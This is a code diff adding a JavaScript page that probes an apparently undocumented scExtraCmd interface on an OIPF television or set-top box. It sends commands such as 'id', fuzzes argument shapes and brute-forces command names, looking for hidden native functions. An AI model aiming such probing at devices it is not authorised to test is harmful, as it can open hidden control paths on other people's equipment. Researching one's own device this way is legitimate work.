+      try {
+        var fields = [];
+        if (event) {
+          var names = Object.getOwnPropertyNames(event);
+          for (var i = 0; i < names.length && i < 80; i++) {
+            try {
+              var value = event[names[i]];
+              if (typeof value !== 'function') {
+                fields.push(names[i] + '=' + String(value).substring(0, 500));
+              }
+            } catch (ignore) {}
+          }
+          for (var key in event) {
+            try {
+              if (typeof event[key] !== 'function') {
+                fields.push(key + '=' + String(event[key]).substring(0, 500));
+              }
+            } catch (ignore2) {}
+            if (fields.length >= 100) { break; }
+          }
+        }
+        show(prefix + ': ' + fields.join(';'));
+      } catch (error) { show(prefix + ' inspection exception=' + error); }
+    }
+
+    function probeScExtraCmdEvents() {
+      document.getElementById('results').textContent = '';
+      show('SCExtraEvt listener probe.start');
+      var targets = [];
+      try {
+        targets.push(['configuration', oipfObjectFactory.createConfigurationObject().configuration]);
+      } catch (error1) { show('configuration creation exception=' + error1); }
+      try {
+        targets.push(['recordingScheduler', oipfObjectFactory.createRecordingSchedulerObject()]);
+      } catch (error2) { show('recordingScheduler creation exception=' + error2); }
+      for (var i = 0; i < targets.length; i++) {
+        (function (label, target) {
+          try {
+            target.onSCExtraEvt = function (event) { reportNativeEvent(label + '.onSCExtraEvt', event); };
+            target.onscextraevt = function (event) { reportNativeEvent(label + '.onscextraevt', event); };
+          } catch (assignError) { show(label + ' handler assignment exception=' + assignError); }
+          var eventNames = ['SCExtraEvt', 'scextraevt', 'SCExtraEvent', 'scExtraEvt'];
+          for (var j = 0; j < eventNames.length; j++) {
+            try {
+              target.addEventListener(eventNames[j], function (event) {
+                reportNativeEvent(label + '.addEventListener', event);
+              });
+              show(label + ' listener added for ' + eventNames[j]);
+            } catch (listenerError) {
+              show(label + ' listener ' + eventNames[j] + ' exception=' + listenerError);
+            }
+          }
+        })(targets[i][0], targets[i][1]);
+      }
+      var commands = ['help', 'version', 'id'];
+      for (var targetIndex = 0; targetIndex < targets.length; targetIndex++) {
+        for (var commandIndex = 0; commandIndex < commands.length; commandIndex++) {
+          try {
+            var reply = targets[targetIndex][1].scExtraCmd(commands[commandIndex]);
+            show(targets[targetIndex][0] + '.scExtraCmd(' + commands[commandIndex] +
+                 ') immediate=' + String(reply).substring(0, 1000));
+          } catch (commandError) {
+            show(targets[targetIndex][0] + '.scExtraCmd(' + commands[commandIndex] +
+                 ') exception=' + commandError);
+          }
+        }
+      }
+      setTimeout(function () { show('SCExtraEvt listener probe.waited10s'); }, 10000);
+    }
+
+    function describeThrown(label, error) {
+      try {
+        var parts = ['typeof=' + typeof error, 'string=' + String(error)];
+        var current = error;
+        for (var depth = 0; current && depth < 4; depth++) {
+          var names = Object.getOwnPropertyNames(current);
+          parts.push('p' + depth + '=' + names.join(','));
+          for (var i = 0; i < names.length && i < 40; i++) {
+            try {
+              if (typeof current[names[i]] !== 'function') {
+                parts.push(names[i] + '=' + String(current[names[i]]).substring(0, 500));
+              }
+            } catch (ignore) {}
+          }
+          current = Object.getPrototypeOf(current);
+        }
+        show(label + ' thrown ' + parts.join(';'));
+      } catch (inspectionError) { show(label + ' thrown inspection failed=' + inspectionError); }
+    }
+
+    function invokeShape(label, target, args) {
+      try {
+        var result = target.scExtraCmd.apply(target, args);
+        show(label + ' returned type=' + typeof result + ' value=' +
+             String(result).substring(0, 1000));
+      } catch (error) { describeThrown(label, error); }
+    }
+
+    function probeScExtraCmdShapes() {
+      document.getElementById('results').textContent = '';
+      show('scExtraCmd shape probe.start');
+      var targets = [];
+      try { targets.push(['configuration', oipfObjectFactory.createConfigurationObject().configuration]); }
+      catch (error1) { describeThrown('configuration create', error1); }
+      try { targets.push(['recordingScheduler', oipfObjectFactory.createRecordingSchedulerObject()]); }
+      catch (error2) { describeThrown('recordingScheduler create', error2); }
+      var shapes = [
+        ['none', []],
+        ['null', [null]],
+        ['number', [0]],
+        ['emptyString', ['']],
+        ['twoStrings', ['probe', 'OIPF_TEST']],
+        ['array', [['probe', 'OIPF_TEST']]],
+        ['object', [{command: 'probe', value: 'OIPF_TEST'}]],
+        ['jsonObject', ['{"command":"probe","value":"OIPF_TEST"}']],
+        ['jsonArray', ['["probe","OIPF_TEST"]']]
+      ];
+      for (var i = 0; i < targets.length; i++) {
+        for (var j = 0; j < shapes.length; j++) {
+          invokeShape(targets[i][0] + '.' + shapes[j][0], targets[i][1], shapes[j][1]);
+        }
+      }
+      show('scExtraCmd shape probe.complete');
+    }
+
+    function discoverRecordingCommands() {
+      document.getElementById('results').textContent = '';
+      show('recording command discovery.start');
+      var scheduler;
+      try { scheduler = oipfObjectFactory.createRecordingSchedulerObject(); }
+      catch (error) { describeThrown('recordingScheduler create', error); return; }
+      var roots = [
+        'status', 'info', 'version', 'capabilities', 'discInfo', 'diskInfo',
+        'storageInfo', 'pvrInfo', 'recordings', 'scheduledRecordings',
+        'freeSpace', 'totalSpace', 'usedSpace', 'capacity', 'health'
+      ];
+      var candidates = [];
+      for (var i = 0; i < roots.length; i++) {
+        var root = roots[i];
+        var cap = root.charAt(0).toUpperCase() + root.substring(1);
+        candidates.push(root, cap, 'get' + cap, 'Get' + cap,
+                        'GET_' + root.replace(/([A-Z])/g, '_$1').toUpperCase());
+      }
+      var accepted = 0;
+      for (var j = 0; j < candidates.length; j++) {
+        try {
+          var result = scheduler.scExtraCmd(candidates[j]);
+          accepted++;
+          show('ACCEPTED ' + candidates[j] + ' type=' + typeof result +
+               ' value=' + String(result).substring(0, 1500));
+        } catch (error2) {
+          /* Unknown commands throw DOMException; suppress expected misses. */
+          if (!error2 || error2.name !== 'DOMException') {
+            describeThrown('candidate ' + candidates[j], error2);
+          }
+        }
+      }
+      show('recording command discovery.complete accepted=' + accepted +
+           ' tested=' + candidates.length);
+    }
+
+    window.onerror = function (message, source, line) {
+      show('JavaScript error: ' + message + ' at line ' + line);
+      return false;
+    };
+  </script>
+</body>
+</html>
